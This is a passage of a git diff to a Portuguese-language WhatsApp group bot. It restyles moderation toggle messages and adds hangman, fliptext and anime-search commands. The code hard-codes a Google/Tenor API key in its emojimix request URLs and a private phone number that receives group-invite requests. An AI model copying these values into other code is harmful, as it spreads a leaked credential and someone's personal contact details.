-anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nantifake está ativo, qualquer número fake será expulso imediatamente!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
+/*anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nantifake está ativo, qualquer número fake será expulso imediatamente!`, contextInfo: { mentionedJid : mems }}, {quoted: m})*/
                     } else if (args[0] === "off") {
                         if (!isAntiFa) return m.reply('❎O recurso de antifake não está ativado no grupo❎')
                         let position = false
@@ -4138,25 +4732,25 @@ anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nan
                             antifake.splice(position, 1)
                             fs.writeFileSync('./database/antis/antifake.json', JSON.stringify(antifake))
                         }
-                        m.reply('❌O recurso de antifake foi desativado❌')
+                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Fake*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
                     } else {
             if (alone3 == 'Ativado✅') {
 let buttonsk = [
-  { buttonId: `${prefix + command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o antifake esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, `*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-FAKE*\n*🎚️Opção: ATIVADO*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti-fake esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo*`, `${watermark}`, m)
 }
 if (alone3 == 'Desativado❌') {
 let buttonsk = [
-  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ON' }, type: 1 }
+  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o antifake esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-FAKE*\n*🎚️Opção: DESATIVADO*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O antifake esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo*', `${watermark}`, m)
 }
   }
                     break
 case 'dontback':
 					if (!m.isGroup) return m.reply(resposta.group)
-					if (!isGroupAdmins && !isGroupOwner) return m.reply(resposta.admin)
+					if (!isAdmins) return m.reply(resposta.admin)
 					if (args.length < 1) return m.reply('Hmmmm')
 					if (Number(args[0]) === 1) {
 						var ind = dbids.indexOf(from)
@@ -4244,7 +4838,7 @@ var alone3 = `${isAntiImg ? 'Ativado✅':'Desativado❌'}`
                         if (isAntiImg) return m.reply('❎O recurso de anti imagem já está ativado no grupo❎')
                         antiimg.push(from)
                         fs.writeFileSync('./database/antis/antiimg.json', JSON.stringify(antiimg))
-                        m.reply('✅O recurso de anti imagem foi ativado✅')
+                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Imagem*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*')
                         var groupe = await anya.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -4264,19 +4858,19 @@ anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nan
                             antiimg.splice(position, 1)
                             fs.writeFileSync('./database/antis/antiimg.json', JSON.stringify(antiimg))
                         }
-                        m.reply('❌O recurso de anti imagem foi desativado❌')
+                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Imagem*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
                     } else {
             if (alone3 == 'Ativado✅') {
 let buttonsk = [
-  { buttonId: `${prefix + command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti imagem esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-IMAGEM*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti imagem esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
 if (alone3 == 'Desativado❌') {
 let buttonsk = [
-  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ON' }, type: 1 }
+  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti imagem esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-IMAGEM*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti imagem esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
   }
                     break
@@ -4290,8 +4884,8 @@ const alone2 = `${isAntiCatalogo ? 'Ativado✅':'Desativado❌'}`
 if (args[0] === "on") {
 if (isAntidoc) return m.reply('Já Esta ativo')
 anticatalogo.push(from)
-fs.writeFileSync('./database/anticatalogo.json', JSON.stringify(anticatalogo))
-m.reply('Ativou com sucesso o recurso de anti documento neste grupo✔️')
+fs.writeFileSync('./database/antis/anticatalogo.json', JSON.stringify(anticatalogo))
+m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Catalogo*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*️')
 var groupe = await anya.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -4302,20 +4896,20 @@ anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nAn
 } else if (args[0] === "off") {
 if (!isAntiCatalogo) return m.reply('Ja esta Desativado.')
 anticatalogo.splice(from, 1)
-fs.writeFileSync('./database/anticatalogo.json', JSON.stringify(anticatalogo))
-m.reply('Desativou com sucesso o recurso de anti catalogo neste grupo✔️')
+fs.writeFileSync('./database/antis/anticatalogo.json', JSON.stringify(anticatalogo))
+m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Catalogo*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*️')
 } else {
 if (alone2 == 'Ativado✅') {
 let buttonsk = [
-  { buttonId: `${prefix + command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti catalogo esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-CATALOGO*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti catalogo esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo*', `${watermark}`, m)
 }
 if (alone2 == 'Desativado❌') {
 let buttonsk = [
-  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ON' }, type: 1 }
+  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti catalogo esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-CATALOGO*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti catalogo esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
 }
 break
@@ -4329,8 +4923,8 @@ const alone1 = `${isAntidoc ? 'Ativado✅':'Desativado❌'}`
 if (args[0] === "on") {
 if (isAntidoc) return m.reply('Já Esta ativo')
 antidoc.push(from)
-fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc))
-m.reply('Ativou com sucesso o recurso de anti documento neste grupo✔️')
+fs.writeFileSync('./database/antis/antidoc.json', JSON.stringify(antidoc))
+m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Documento*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*')
 var groupe = await anya.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -4341,20 +4935,20 @@ anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nAn
 } else if (args[0] === "off") {
 if (!isAntidoc) return m.reply('Ja esta Desativado.')
 antidoc.splice(from, 1)
-fs.writeFileSync('./database/antidoc.json', JSON.stringify(antidoc))
-m.reply('Desativou com sucesso o recurso de anti documento neste grupo✔️')
+fs.writeFileSync('./database/antis/antidoc.json', JSON.stringify(antidoc))
+m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Documento*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
 } else {
             if (alone1 == 'Ativado✅') {
 let buttonsk = [
-  { buttonId: `${prefix + command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti documento esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-DOCUMENTO*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*o anti documento esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
 if (alone1 == 'Desativado❌') {
 let buttonsk = [
-  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ON' }, type: 1 }
+  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti documento esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-DOCUMENTO*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*o anti documento esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
 }                   
 break
@@ -4431,7 +5025,7 @@ var alone3 = `${isAntiVO ? 'Ativado✅':'Desativado❌'}`
                         if (isAntiVO) return m.reply('❎O recurso de anti visualização unica já está ativado no grupo❎')
                         antiviewonce.push(from)
                         fs.writeFileSync('./database/antis/antiviewonce.json', JSON.stringify(antiviewonce))
-                        m.reply('✅O recurso de anti visualização unica foi ativado✅')
+                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Visualização Única*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*')
                         var groupe = await anya.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -4450,19 +5044,19 @@ mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                             antiviewonce.splice(position, 1)
                             fs.writeFileSync('./database/antis/antiviewonce.json', JSON.stringify(antiviewonce))
                         }
-                        m.reply('❌O recurso de anti visualização unica foi desativado❌')
+                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Visualização Única*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
                     } else {
             if (alone3 == 'Ativado✅') {
 let buttonsk = [
-  { buttonId: `${prefix + command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti visualização unica esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-VIEWONCE*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti visualização unica esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
 if (alone3 == 'Desativado❌') {
 let buttonsk = [
-  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ON' }, type: 1 }
+  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
   ]
-  await anya.sendButtonText(m.chat, buttonsk, 'o anti visualização unica esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
+  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-VIEWONCE*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti visualização unica esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
   }
                     break
@@ -4483,7 +5077,7 @@ case 'mute': {
                         { buttonId: '!mute on', buttonText: { displayText: 'ON' }, type: 1 },
                         { buttonId: '!mute off', buttonText: { displayText: 'OFF' }, type: 1 }
                     ]
-                    await anya.sendButtonText(m.chat, buttons, `Silenciar bot`, anya.user.name, m)
+                    await anya.sendButtonText(m.chat, buttons, `Silenciar bot`, `${watermark}`, m)
                 }
              }
              break
@@ -4540,19 +5134,19 @@ fs.unlinkSync(`./src/anagrama-${from}.json`)
 m.reply("desativado com sucesso")
 }
 break 
-case 'autostickerpc':
+case 'autostickerpv':
             case 'autostikerpc':
 if (!m.isGroup) return m.reply(mess.group)
 //if (args.length < 1) return m.reply('digite um adesivo para ativar\n digite o adesivo automático para desativar')
 if (args[0]  === 'on'){
 if (isAutoStick) return m.reply(`Já ativado`)
 _autostick.push(from)
-fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
+fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autostick))
 m.reply('autosticker pc ativado')
 } else if (args[0] === 'off'){
-let anu = autosticker.indexOf(from)
+let anu = autostick.indexOf(from)
 _autostick.splice(anu, 1)
-fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autosticker))
+fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autostick))
 m.reply('autosticker pc desativado')
 }
 break
@@ -4613,6 +5207,7 @@ let buttons = [
                         { buttonId: `${prefix}negarconvite ${m.sender.split("@s.whatsapp.net")[0]}`, buttonText: { displayText: `𝐍𝐄𝐆𝐀𝐑 𝐂𝐎𝐍𝐕𝐈𝐓𝐄` }, type: 1 }
                     ]
                     await anya.sendButtonText(`558898204406@s.whatsapp.net`, buttons, `[CONVITE]\nDe: wa.me/${m.sender.split("@s.whatsapp.net")[0]}\nLink: ${body.slice(8)}`, watermark, m)
+ m.reply('a solicitação para o bot entrar no seu grupo foi enviada para o meu criador, agr cabe a ele decidir se eu entro no seu grupo ou não!')                   
 break
 
 case `entrarlink`:
@@ -4643,11 +5238,11 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
                 if (!m.isGroup) return m.reply(mess.group)
                 if (!isBotAdmins) return m.reply(mess.botAdmin)
                 if (!isAdmins && !groupOwner) return m.reply(mess.admin)
-                if (c === `abrir`){
+                if (q === `abrir`){
               await anya.groupSettingUpdate(m.chat, `not_announcement`).then((res) => m.reply(`grupo aberto com sucesso`)).catch((err) => m.reply(jsonformat(err)))
-              } else if (c === `fechar`){
+              } else if (q === `fechar`){
               await anya.groupSettingUpdate(m.chat, `announcement`).then((res) => m.reply(`grupo fechado com sucesso`)).catch((err) => m.reply(jsonformat(err)))
-             } else if (!c) {
+             } else if (!q) {
             enviarbutao(m.chat, `🔒 *_COFIGURAÇÃO DO GRUPO_* 🔓`, `Selecione abaixo`,  [{ quickReplyButton: { displayText: `🔓ABRIR`, id: `${prefix}gp abrir` } }, { quickReplyButton: { displayText: `🔒FECHAR`, id: `${prefix}gp fechar` } }])           
             }
             }
@@ -4703,6 +5298,15 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
                     anya.sendText(m.chat, 'Lista de membros online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break
+case 'fliptext': {
+/*   if (isBan) return reply(mess.ban)	 			
+if (isBanChat) return reply(mess.banChat)*/
+if (args.length < 1) return m.reply(`Exemplo:\n${prefix}fliptext alone`)
+quere = args.join(" ")
+flipe = quere.split('').reverse().join('')
+m.reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
+}
+break
 /*case 'autoescrever':
            if (q === 'on'){
              autocomposing = true
@@ -4748,6 +5352,7 @@ break
               
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
 	        if (!text) return m.reply(`Exemplo : ${prefix + command} 😡+🤔`)
+	        m.reply(mess.wait)
 		let [emoji1, emoji2] = text.split`+`
 		let anusk = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
 		for (let res of anusk.results) {
@@ -4758,41 +5363,20 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 	    break  
 case 'emojimix2': {
 	    if (!text) return m.reply(`Exemplo : ${prefix + command} 😅`)
-		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
-		for (let res of anu.results) {
+	    m.reply(mess.wait)
+		let anuuu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
+		for (let res of anuuu.results) {
 		    let encmedia = await anya.sendImageAsSticker(m.chat, res.url, m, { packname: packname, author: author, categories: res.tags })
 		    await fs.unlinkSync(encmedia)
 		}
 	    }
 	    break
-case 'emoji': {
-if (!args.join(" ")) return m.reply('Onde está o emoji?')
-emoji.get(args.join(" ")).then(async(emoji) => {
-let mese = await anya.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Feito por ${nomedobot}`}, {quoted:m})
-await anya.sendMessage(from, {text:"responda a esta imagem com !s para fazer uma figurinha"}, {quoted:mese})
-})
-}
-break
-case 'emoji2': {
-if (!args.join(" ")) return m.reply('Onde está o emoji?')
-emoji.get(args.join(" ")).then(async(emoji) => {
-anya.sendImageAsSticker(m.chat, emoji.images[4].url, m, { packname: packname, author: author }).catch((err) => m.reply(jsonformat('*Sorry there was an error*'))) 
-})
-}
-break
 case 'tinyurl': {
               
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-            const templateMessage = {
-text: "*_AGUARDE.._*",
-footer: 'não deve demorar muito..',
-templateButtons: []
-}
-
-anya.sendMessage(m.chat, templateMessage)
             try {
               anu = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
-              m.reply(`${anu.data} here you go!`)
+              m.reply(`${anu.data}`)
               } catch (e) {
               emror = String(e)
               m.reply(`${e}`)
@@ -4809,13 +5393,6 @@ case `tomp4`: case `tovideo`: {
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                 if (!quoted) return m.reply(mess.marquest)
                 if (!/webp/.test(mime)) return m.reply(`marque o arquivo com` + `*${prefix + command}*`)
-                const templateMessage = {
-text: "*_AGUARDE.._*",
-footer: 'não deve demorar muito..',
-templateButtons: []
-}
-
-anya.sendMessage(m.chat, templateMessage)
                 let media = await anya.downloadAndSaveMediaMessage(quoted)
                 let webpToMp4 = await webp2mp4File(media)
                 await anya.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: mess.convertmsgvideo } }, { quoted: m })
@@ -4827,13 +5404,6 @@ case 'tomp3': {
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
 if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Enviar/responder vídeo/áudio que você deseja converter em MP3 com legenda ${prefix + command}`)
 if (!m.quoted) return m.reply(`Enviar/responder vídeo/áudio que você deseja converter em MP3 com legenda ${prefix + command}`)
-const templateMessage = {
-text: "*_AGUARDE.._*",
-footer: 'não deve demorar muito..',
-templateButtons: []
-}
-
-anya.sendMessage(m.chat, templateMessage)
 let media = await quoted.download()
 let { toAudio } = require('./lib/converter')
 let audio = await toAudio(media, 'mp4')
@@ -4857,9 +5427,9 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 case 'readmore': {
             
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-                if (!text) return m.reply(`Example : ${prefix + command} halo gaes`)
-                anu = await fetchJson(`https://cililitan.herokuapp.com/api/readmore?teks=${text}`)
-               m.reply('${anu.result}')
+                if (!text) return m.reply(`Exemplo : ${prefix + command} alonekk`)
+                anuv = await fetchJson(`https://cililitan.herokuapp.com/api/readmore?teks=${text}`)
+               m.reply(`${anuv.result}`)
             }
             break
 case `metadinha`: {
@@ -4938,6 +5508,7 @@ m.reply(`*✔️ Comando ${args[0]} desbloqueado com sucesso*`)
 m.reply('algo deu errado')
 }
 break
+
 	    case 'ativos': {
 theuszin = `
 ┌──⊰「 *_ATIVOS_* 」
@@ -4964,6 +5535,99 @@ let buttons = [
                 anya.sendMessage(m.chat, buttonMessage, { quoted: m })
                    }
                    break
+case 'resetforca':
+if (!m.isGroup) return m.reply('Só em Grupo')
+
+if(!isPlayForca) return m.reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
+pla_pos = allForcaId.indexOf(sender)
+forca.splice(pla_pos, 1)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+m.reply(`*Jogo da forca reiniciado com sucesso. Para iniciar outra partida dê o comando ${prefix}jogodaforca*`)
+break
+case 'forca':
+if(!isPlayForca) return m.reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
+if(args.length < 1) return m.reply(`*Dê o comando mais a letra para advinhar*`)
+if(args[0].trim().length < 2) {
+    p_pos = allForcaId.indexOf(sender)
+    find = forca[p_pos].word.match(args[0].toLowerCase())
+    is_correct = false 
+    while(find != null) {
+res_tmp = forca[p_pos].word.indexOf(args[0].toLowerCase())
+forca[p_pos].array_under_word[res_tmp] = args[0].toLowerCase()
+forca[p_pos].array_word[res_tmp] = 0
+forca[p_pos].word = forca[p_pos].word.replace(args[0].toLowerCase(), 0)
+find = forca[p_pos].word.match(args[0].toLowerCase())
+is_correct = true
+    }
+    if(is_correct) {
+str_under = ''
+for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
+attempts = forca[p_pos].attempts
+if(str_under == forca[p_pos].word_original) {
+m.reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_`)
+forca.splice(p_pos, 1)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+} else {
+m.reply(`*Você acertou!✅*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_\n*Você tem ${attempts} chances*`)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+}
+    } else  {
+str_under = ''
+for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
+forca[p_pos].attempts -= 1
+attempts = forca[p_pos].attempts
+if(forca[p_pos].attempts <= 0) {
+forca.splice(p_pos, 1)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+m.reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
+} else {
+m.reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+}
+    }
+} else {
+    p_pos = allForcaId.indexOf(sender)
+    if(forca[p_pos].word_original == args[0].toLowerCase()) {
+attempts = forca[p_pos].attempts
+m.reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${forca[p_pos].word_original.split('').join(' ')}*_`)
+forca.splice(p_pos, 1)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+    } else {
+str_under = ''
+for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
+forca[p_pos].attempts -= 1
+attempts = forca[p_pos].attempts
+if(forca[p_pos].attempts <= 0) {
+forca.splice(p_pos, 1)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+m.reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
+} else {
+m.reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+}
+    }
+}
+break
+
+case 'jogodaforca':
+if (!m.isGroup) return m.reply('Só em Grupo')
+if (args.length < 1) return m.reply('Ative pressione 1, Desativar pressione 0')
+if(isPlayForca) return m.reply(`*Termine a partida iniciada para jogar uma nova, ou dê o comando ${prefix}resetforca*`)
+word_correct = (await randompalavra()).slice(1).normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase()
+under_word = '-'.repeat(word_correct.length)
+forca.push({
+    id: sender,
+    word_original: word_correct,
+    word: word_correct,
+    under_word: under_word,
+    array_word: Array.from(word_correct),
+    array_under_word: Array.from(under_word),
+    tam: word_correct.length,
+    attempts: 6
+})
+fs.writeFileSync('./database/forca.json', JSON.stringify(forca, null, 2))
+m.reply(`*Jogo da forca iniciado!✅*\n\n*Palavra: ${under_word.split('').join(' ')}*\n*Para advinhar uma letra , dê o comando ${prefix}forca mais a letra*`)
+break
 case `nick`: case `styletext`: {
 	  
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
@@ -5002,17 +5666,10 @@ m.reply("Case não encontrado")
 break
 case `anime`: {
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-const templateMessage1 = {
-text: "*_AGUARDE.._*",
-footer: 'não deve demorar muito..',
-templateButtons: []
-}
-
-anya.sendMessage(m.chat, templateMessage1)
                 if (!text) return m.reply(`Digite o nome do anime`)
 		let { wallpaper } = require(`./lib/scraper`)
-                anu = await wallpaper(text)
-                result11 = anu[Math.floor(Math.random() * anu.length)]
+                anuu = await wallpaper(text)
+                result11 = anuu[Math.floor(Math.random() * anuu.length)]
 		let buttons = [
                     {buttonId: `${prefix}anime ${text}`, buttonText: {displayText: `🌠Proxima Imagem🌠`}, type: 1}
                 ]
@@ -5026,6 +5683,47 @@ anya.sendMessage(m.chat, templateMessage1)
                 anya.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
+case 'animestory': { 
+/*	if (isBan) return reply(mess.ban)	 			
+if (isBanChat) return reply(mess.banChat)*/
+m.reply(mess.wait)
+await fetchJson(`https://api.jikan.moe/v4/anime?q=${q}`)
+.then((res) =>{
+console.log(res)   
+let sections = []   
+  for (let i of res.data) {
+  const list = {title: `${i.title}`,
+  rows: [
+	    {
+	     title: `${i.title}\n\n`, 
+	     rowId: `${prefix}animesearch ${i.mal_id}`,
+	     description: `${i.synopsis}`
+	    }, 
+	    ]
+     }
+     sections.push(list)   
+     }
+  const sendm =  anya.sendMessage(
+      from, 
+      {
+       text: "Pesquisa de anime",
+       footer: nomedobot,
+       title: nomedodono,
+       buttonText: "Clique e veja os resultados da pesquisa ➡️",
+       sections
+      }, { quoted : m }
+    )  
+})
+}
+  break
+case 'animesearch':{
+await fetchJson(`https://api.jikan.moe/v4/anime/${q}`)
+.then((res) => {
